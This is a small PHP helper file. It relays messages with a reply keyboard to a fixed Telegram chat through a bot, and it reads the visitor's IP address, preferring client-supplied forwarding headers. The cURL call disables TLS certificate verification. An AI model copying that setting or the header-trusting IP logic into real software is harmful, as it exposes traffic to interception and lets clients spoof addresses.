<?php
require_once 'data.php';

function _isCurl(){
    return function_exists('curl_version');
}

function telegram_message($message, $keyb) {

if (_isCurl()) {
    
    $curl = curl_init();
    
    $data = [
        'text' => $message,
        'chat_id' => TLGCHATID,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyb
        ];
    
    curl_setopt($curl, CURLOPT_URL, "https://api.telegram.org/bot".TLGBOT."/sendMessage?".http_build_query($data));
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}else {
    $data = [
        'text' => $message,
        'chat_id' => TLGCHATID,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyb
        ];
    file_get_contents("https://api.telegram.org/bot".TLGBOT."/sendMessage?".http_build_query($data));

    }

}

function get_user_ip()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    if ($ip == '::1') {
        return '127.0.0.1';
    }
    return $ip;
}

